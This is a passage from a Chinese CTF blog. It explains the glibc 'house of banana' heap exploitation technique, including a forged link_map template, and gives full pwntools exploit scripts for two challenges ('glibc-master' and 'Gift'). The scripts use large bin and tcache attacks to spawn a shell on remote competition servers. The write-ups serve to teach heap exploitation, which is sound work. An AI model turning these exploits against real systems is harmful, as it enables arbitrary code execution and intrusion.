<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_dl_fini (<span class="hljs-keyword">void</span>)<br>&#123;<br>...<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">maps</span>[<span class="hljs-title">nloaded</span>];</span>    <br><br>   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i;<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>   assert (nloaded != <span class="hljs-number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="hljs-literal">NULL</span>);<br>   <span class="hljs-keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="hljs-number">0</span>; l != <span class="hljs-literal">NULL</span>; l = l-&gt;l_next)<br>     <span class="hljs-comment">/* Do not handle ld.so in secondary namespaces.  */</span><br>     <span class="hljs-keyword">if</span> (l == l-&gt;l_real)      <span class="hljs-comment">//检查节点的地址是否跟自己结构体保存的一致</span><br>       &#123;<br>  assert (i &lt; nloaded);<br><br>  maps[i] = l;<br>  l-&gt;l_idx = i;<br>  ++i;<br><br>  <span class="hljs-comment">/* Bump l_direct_opencount of all objects so that they</span><br><span class="hljs-comment">     are not dlclose()ed from underneath us.  */</span><br>  ++l-&gt;l_direct_opencount;<br>       &#125;<br>   assert (ns != LM_ID_BASE || i == nloaded);<br>   assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br>   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nmaps = i;<br><br>   _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-literal">true</span>);<br><br>   __rtld_lock_unlock_recursive (GL(dl_load_lock));<br><br>   <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nmaps; ++i)<br>     &#123;<br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span> =</span> maps[i];   <span class="hljs-comment">//l遍历link_map的链表</span><br><br>       <span class="hljs-keyword">if</span> (l-&gt;l_init_called)     <span class="hljs-comment">//重要的检查点</span><br>  &#123;<br>    l-&gt;l_init_called = <span class="hljs-number">0</span>;      <br><br>    <span class="hljs-comment">/* Is there a destructor function?  */</span><br>    <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span><br>        || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>))<br>      &#123;<br>        <span class="hljs-comment">/* When debugging print a message first.  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)<br>         &amp; DL_DEBUG_IMPCALLS, <span class="hljs-number">0</span>))<br>   _dl_debug_printf (<span class="hljs-string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<br>       DSO_FILENAME (l-&gt;l_name),<br>       ns);<br><br>        <span class="hljs-comment">/* First see whether an array is given.  */</span><br>        <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span>)<br>   &#123;<br>     ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>       (ElfW(Addr) *) (l-&gt;l_addr<br>         + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br>     <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>         / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br>     <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>       ((<span class="hljs-keyword">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();     <span class="hljs-comment">//目标位置</span><br>   &#125;<br><br>....<br>&#125;<br></code></pre></td></tr></table></figure>

<p>重点关注：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">     <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>    (ElfW(Addr) *) (l-&gt;l_addr<br>      + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>      / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br>  <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>    ((<span class="hljs-keyword">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();     <span class="hljs-comment">//目标位置</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>DT_FINI_ARRAY 宏定义为 26，DT_FINI_ARRAYSZ 宏定义为 28。d_un.d_ptr 则是取 +8 处的指针，d_un.d_val 则是取 +8 处的值。</p>
<p>在有些情况下，rtld_global_ptr 与 libc_base 的偏移在本地与远程并不是固定的，远程的 ld.so 以及 TLS 等结构的地址与 libc 地址之间的偏移与本地的会不一样，但是大致处于一个范围内，并且，在同一个系统里，这个差值是固定的，其差值的变化往往在偏移的第 1.5BYTE~2.5BYTE 的位置，即地址十六进制的第4、5个数（末三位不变），因此我们只需爆破两个十六进制数即可。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>通过 large bin attack 替换 link_map 链表第3节点的 l_next。</p>
<p>可以利用下面的命令查看需要修改的地址。</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">distance</span> &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;</span><span class="hljs-function"><span class="hljs-title">l_next</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">l_next</span>-&gt;</span>l_next)<br>或者 <br><span class="hljs-function"><span class="hljs-title">p</span> &amp;(_rtld_global._dl_ns._ns_loaded-&gt;</span><span class="hljs-function"><span class="hljs-title">l_next</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">l_next</span>-&gt;</span>l_next)<br></code></pre></td></tr></table></figure>

<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143354716.png"><span class="image-caption">image-20220825143354716</span></p>
<p>link_map 布局：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fake 是写入到 link_map 链表，伪造成第4节点的堆块地址</span><br>*(fake+<span class="hljs-number">0x28</span>) = fake    <span class="hljs-comment"># l == l-&gt;l_real</span><br>*(fake+<span class="hljs-number">0x48</span>) = fake + <span class="hljs-number">0x58</span>, <br>*(fake+<span class="hljs-number">0x50</span>) = <span class="hljs-number">0x8</span><br>*(fake+<span class="hljs-number">0x58</span>) = shell<br>*(fake+<span class="hljs-number">0x110</span>) = fake + <span class="hljs-number">0x40</span><br>*(fake+<span class="hljs-number">0x120</span>) = fake + <span class="hljs-number">0x48</span><br>(<span class="hljs-built_in">int</span>)*(fake+<span class="hljs-number">0x31c</span>) = <span class="hljs-number">0x9</span>    <span class="hljs-comment"># l-&gt;l_init_called &gt; 8</span><br></code></pre></td></tr></table></figure>

<p>模板参考：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">ogg = leak + <span class="hljs-number">0xe6c7e</span><br>fake = heap + offset    <span class="hljs-comment"># 布局堆所在地址</span><br>fake_link_map = <span class="hljs-string">b&#x27;&#x27;</span><br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fake)  <span class="hljs-comment"># l == l-&gt;l_real</span><br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fake+<span class="hljs-number">0x58</span>) + p64(<span class="hljs-number">8</span>) + p64(ogg)<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fake+<span class="hljs-number">0x40</span>)<br>fake_link_map += p64(<span class="hljs-number">0</span>) + p64(fake+<span class="hljs-number">0x48</span>)<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x30C</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">9</span>)  <span class="hljs-comment"># l-&gt;l_init_called &gt; 8</span><br></code></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>适用版本：目前已知版本都可以攻击利用。</p>
<p>攻击前提：</p>
<ol>
<li>需要通过正常 main 函数返回或者调用 exit 退出来触发利用链。</li>
<li>拥有堆地址和 libc 地址。</li>
<li>只需要一次往任意地址（link_map 中链表的 l_next 指针）写一个可控地址。</li>
</ol>
<h2 id="题目-glibc-master"><a href="#题目-glibc-master" class="headerlink" title="题目 glibc-master"></a>题目 glibc-master</h2><p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143519008.png"><span class="image-caption">image-20220825143519008</span></p>
<p>申请函数，只允许申请到0x40f~0x60f的堆块。</p>
<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143505081.png"><span class="image-caption">image-20220825143505081</span></p>
<p>释放时存在UAF。</p>
<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143604709.png"><span class="image-caption">image-20220825143604709</span></p>
<p>打印函数只允许打印两次，但是能直接打印地址。</p>
<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143628967.png"><span class="image-caption">image-20220825143628967</span></p>
<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825143758891.png"><span class="image-caption">image-20220825143758891</span></p>
<p>编辑函数把真正操作堆块内容的部分都隐藏了，无法反汇编，只能查看汇编语言进行分析。嫌麻烦，没去分析，选择直接去调试，发现只要写入的数据长度小于申请的size就是正常的写入，如果等于，输入的内容就会被更改成垃圾数据。</p>
<p>所以这题使用 house of banana 打的话，不难，利用好 largebin attack 即可。</p>
<p>要使用 house of banana，是需要有 libc 和 堆地址的，libc比较容易，申请释放一个堆块即可。</p>
<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825144305886.png"><span class="image-caption">image-20220825144305886</span></p>
<p>因为打印函数是 puts，存在 ‘\x00’阻断，所以堆地址需要在 fd 上才能被打印出来。大堆块自然能够想到都是 large bin 时，fd是会指向堆块的，也就可以泄露出堆地址。</p>
<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825144537239.png"><span class="image-caption">image-20220825144537239</span></p>
<p>接着就是利用 largebin attack 写入堆地址，再将堆块伪造成 link_map 的节点。</p>
<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825144842830.png"><span class="image-caption">image-20220825144842830</span></p>
<p>然后成功 getshell。</p>
<p><img src="/2022/08/25/2022-08-25-house-of-banana/image-20220825144055306.png"><span class="image-caption">image-20220825144055306</span></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> errno <span class="hljs-keyword">import</span> EDEADLK<br><span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> S<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./glibc_master&#x27;</span>)<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;123.56.77.227&#x27;</span><br>    port = <span class="hljs-number">42231</span><br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx, size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;input size:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>	<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;input context:\n&quot;</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input index:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x428</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x410</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ebbe0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x500</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x500</span>)<br>show(<span class="hljs-number">0</span>)<br>heap = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xae0</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap)<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x418</span>)<br>free(<span class="hljs-number">6</span>)<br>fd = leak + <span class="hljs-number">0x1ebfd0</span><br>target = <span class="hljs-number">0x1f2018</span> + leak<br>edit(<span class="hljs-number">0</span>, p64(fd)*<span class="hljs-number">2</span> + p64(heap+<span class="hljs-number">0x290</span>) + p64(target-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x500</span>)<br>ogg = leak + <span class="hljs-number">0xe6c7e</span><br>fake = heap + <span class="hljs-number">0xae0</span><br>fake_link_map = <span class="hljs-string">b&#x27;&#x27;</span><br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fake)<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fake+<span class="hljs-number">0x58</span>) + p64(<span class="hljs-number">8</span>) + p64(ogg)<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fake+<span class="hljs-number">0x40</span>)<br>fake_link_map += p64(<span class="hljs-number">0</span>) + p64(fake+<span class="hljs-number">0x48</span>)<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x30C</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">2</span>, fake_link_map)<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;input index:\n&quot;</span>)<br><br><span class="hljs-comment">#debug()</span><br>p.sendline(<span class="hljs-string">b&#x27;30&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h2><p><a href="https://www.anquanke.com/post/id/222948#h2-9">https://www.anquanke.com/post/id/222948#h2-9</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/535469996">https://zhuanlan.zhihu.com/p/535469996</a></p>
]]></content>
  </entry>
  <entry>
    <title>2022巅峰极客</title>
    <url>/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
    <content><![CDATA[<h2 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h2><p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831211909452.png"><span class="image-caption">image-20220831211909452</span></p>
<p>检查保护机。这题没给libc，我是通过 double free 以及打印fd的内容，判断版本应该是在2.27，小版本我直接用到了最高的去调试。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831212240031.png"><span class="image-caption">image-20220831212240031</span></p>
<p>最多申请十个堆块，只能申请size为0x100或者0x60的堆块，申请后输入的长度比申请少0x10。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831212508377.png"><span class="image-caption">image-20220831212508377</span></p>
<p>释放堆块存在UAF。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831212802935.png"><span class="image-caption">image-20220831212802935</span></p>
<p>只能打印堆块+0x10后的内容。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831213039296.png"><span class="image-caption">image-20220831213039296</span></p>
<p>这里的v2是有符号数，所以如果为负数时，就可以让一个堆块的fd指针加上一个较大的数。</p>
<p>这题花了挺多时间进行构造的，难点在于泄露地址后，再达成一次任意写会发现堆块申请次数不够用，要进行更加节省的构造才行。</p>
<p>想要达成任意写，如果是修改fd，这题又只有在申请堆块时才可以进行写堆块，那么就得申请三次才能达成，在次数紧张的情况下，我又没想到有其他布局可以节省泄露地址使用的次数，就想到了可以通过劫持 tcache bin，修改上面的内容，只需要两次就可以做到任意地址写，节省了一次。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220901105227963.png"><span class="image-caption">image-20220901105227963</span></p>
<p>在泄露出堆地址之后，修改fd指针，指向0x70堆块的前0x10位置，然后将堆块分配过去，进行修改0x70的fd指针。这里的三个堆块size是错开的，防止进入同一个tcache bin中。而选择修改0x70堆块覆盖tcache，是因为记录第一个被释放的0x70堆块比较靠前，如果是0x110的太靠后，可写长度不足以覆盖到。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220901105909290.png"><span class="image-caption">image-20220901105909290</span></p>
<p>这一步的构造算是最巧的一步了，当初也想了挺久的。在把堆块分配过去后，为了能够出现libc地址，需要去伪造一个size至少为0x420的堆块，所以我借助部分的tcache bin加上之前申请的堆块进行伪造大堆块，（同时这也是另外一个需要申请两个0x110堆块的理由，如果是两个0x70的堆块是不够长的）；且需要将其释放掉，则在属于0x70的位置上填入了伪造堆块的地址，可以让堆块分配过来。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220901110006418.png"><span class="image-caption">image-20220901110006418</span></p>
<p>伪造fake chunk时，还需要伪造一个尾部堆块，保持堆块内存的连续性。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220901110811658.png"><span class="image-caption">image-20220901110811658</span></p>
<p>释放后成功获得libc地址，此时已经申请了八次堆块，还剩下两次申请机会。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220901111124906.png"><span class="image-caption">image-20220901111124906</span></p>
<p>两次刚好足够，一次填写地址，一次分配堆块达成任意写，这次就不要再用0x70分配，透支了两次，已经坏掉了。最开始是想要填入system地址的，但是因为堆块的前0x10都是已经填入了内容，使用了||貌似也没办法忽略，所以最后还是用了one_gadget getshell。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/QQ%E5%9B%BE%E7%89%8720220817184118.png"><span class="image-caption">QQ图片20220817184118</span></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;123.56.45.214&#x27;</span><br>    port = <span class="hljs-number">33027</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>    p = remote(ip, port)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;your choice:\n&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;your choice:\n&quot;</span>)<br>    <span class="hljs-keyword">if</span> size == <span class="hljs-number">0x100</span>:<br>        p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;plz write your wish on your gift!\n&quot;</span>)<br>    p.send(content)<br>	<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;your choice:\n&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;index?\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;your choice:\n&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;index?\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>))<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;cost: &quot;</span>)<br>heap = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">10</span>) - <span class="hljs-number">0x250</span><br>log.info(<span class="hljs-string">&quot;heap==&gt;0x%x&quot;</span> %heap)<br>p.sendlineafter(<span class="hljs-string">b&quot;your choice:\n&quot;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;index?\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;How much?\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;-240&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x100</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(heap + <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(heap + <span class="hljs-number">0x40</span>))<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;cost: &quot;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">10</span>) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>free_hook = leak + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys = leak + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>ogg = leak + <span class="hljs-number">0x4f302</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&quot;||sh&quot;</span>*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">12</span> + p64(free_hook - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0x100</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(ogg))<br><span class="hljs-comment">#debug()</span><br>free(<span class="hljs-number">8</span>)<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="smallcontainer"><a href="#smallcontainer" class="headerlink" title="smallcontainer"></a>smallcontainer</h2><p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831202742252.png"><span class="image-caption">image-20220831202742252</span></p>
<p>首先确定附件的保护机制以及libc版本号。</p>
<p><img src="/2022/08/25/2022-08-25-2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20220831203907328.png"><span class="image-caption">image-20220831203907328</span></p>
